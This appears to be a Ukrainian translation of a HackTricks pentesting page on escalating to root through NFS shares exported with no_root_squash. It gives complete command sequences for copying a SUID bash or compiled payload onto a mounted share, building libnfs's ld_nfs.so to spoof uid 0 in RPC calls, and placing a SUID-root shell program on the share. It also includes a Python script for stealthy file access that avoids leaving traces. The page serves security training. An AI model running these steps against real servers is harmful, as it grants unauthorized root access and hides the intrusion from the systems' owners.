# Підвищення привілеїв через неправильну конфігурацію NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Базова інформація про squashing

NFS зазвичай (особливо в Linux) довіряє вказаним клієнтом `uid` і `gid` для доступу до файлів (якщо не використовується Kerberos). Однак на сервері можна налаштувати деякі параметри, щоб **змінити цю поведінку**:

- **`all_squash`**: застосовує squash до всіх доступів, зіставляючи кожного користувача та групу з **`nobody`** (65534 unsigned / -2 signed). Таким чином, усі є `nobody`, і жодні користувачі не використовуються.
- **`root_squash`/`no_all_squash`**: це стандартна конфігурація в Linux, яка застосовує squash **лише до доступу з uid 0 (root)**. Тому будь-які `UID` і `GID` приймаються, але `0` зіставляється з `nobody` (отже, impersonation root неможливе).
- **``no_root_squash`**: якщо цю конфігурацію увімкнено, squash не застосовується навіть до користувача root. Це означає, що якщо змонтувати директорію з такою конфігурацією, можна отримати до неї доступ як root.

У файлі **/etc/exports**, якщо ви знайдете директорію, налаштовану з **no_root_squash**, то зможете **отримати до неї доступ** як **клієнт** і **записувати в неї** так, ніби ви є локальним **root** цієї машини.

Докладніше про **NFS**:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Підвищення привілеїв

### Remote Exploit

Варіант 1 із використанням bash:
- **Змонтувати цю директорію** на клієнтській машині, а потім **від імені root скопіювати** у змонтовану папку бінарний файл **/bin/bash** і надати йому права **SUID**, після чого **виконати на машині жертви** цей бінарний файл bash.
- Зверніть увагу, що для отримання root усередині NFS share на сервері має бути налаштовано **`no_root_squash`**.
- Однак якщо цю опцію не ввімкнено, можна підвищити привілеї до іншого користувача, скопіювавши бінарний файл у NFS share і надавши йому дозвіл SUID від імені користувача, до якого потрібно підвищити привілеї.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 using c compiled code:
- **Монтування цього каталогу** на клієнтській машині та **копіювання від імені root** у змонтовану папку нашого скомпільованого payload, який зловживає дозволом SUID, надання йому прав **SUID** і **виконання на машині жертви** цього binary (тут можна знайти деякі [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Ті самі обмеження, що й раніше
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Зверніть увагу: якщо ви можете створити **тунель зі своєї машини до машини жертви, ви все одно можете використати Remote version для exploitation цього privilege escalation, прокинувши необхідні порти**.\
> Наступний trick потрібен у випадку, якщо файл `/etc/exports` **вказує IP**. У такому випадку ви **не зможете використати** за жодних умов **remote exploit** і вам потрібно буде **abuse цей trick**.\
> Ще одна необхідна умова для роботи exploit полягає в тому, що **export у `/etc/export`** **має використовувати `insecure` flag**.\
> --_Я не впевнений, що цей trick працюватиме, якщо `/etc/export` вказує IP-адресу_--

### Основна інформація

Сценарій передбачає exploitation змонтованого NFS share на локальній машині з використанням недоліку у специфікації NFSv3, який дозволяє client вказувати власні uid/gid, що потенційно може надати несанкціонований доступ. Exploitation передбачає використання [libnfs](https://github.com/sahlberg/libnfs) — library, яка дозволяє підробляти NFS RPC calls.<sup>[[1]](#references)</sup>

#### Компіляція Library

Кроки компіляції library можуть потребувати коригувань залежно від версії kernel. У цьому конкретному випадку syscalls fallocate було закоментовано. Процес компіляції передбачає використання таких команд:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Проведення Exploit

Exploit передбачає створення простої C-програми (`pwn.c`), яка підвищує привілеї до root, а потім запускає shell. Програму компілюють, а отриманий binary (`a.out`) розміщують на share із suid root, використовуючи `ld_nfs.so` для підробки uid у RPC-викликах:

1. **Компіляція коду Exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Розмістіть exploit у спільному ресурсі та змініть його дозволи, підробивши uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Виконайте exploit для отримання root-привілеїв:**
```bash
/mnt/share/a.out
#root
```
### Бонус: NFShell для прихованого доступу до файлів

Після отримання root-доступу для взаємодії з NFS share без зміни власника (щоб не залишати слідів) використовується Python-скрипт (nfsh.py). Цей скрипт налаштовує uid відповідно до uid файлу, до якого здійснюється доступ, що дає змогу взаємодіяти з файлами на share без проблем із дозволами:<sup>[[1]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Запустіть як:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Посилання

- [1] [Історія про менш відомий NFS privesc](https://www.errno.fr/nfs_privesc.html)

{{#include ../../banners/hacktricks-training.md}}
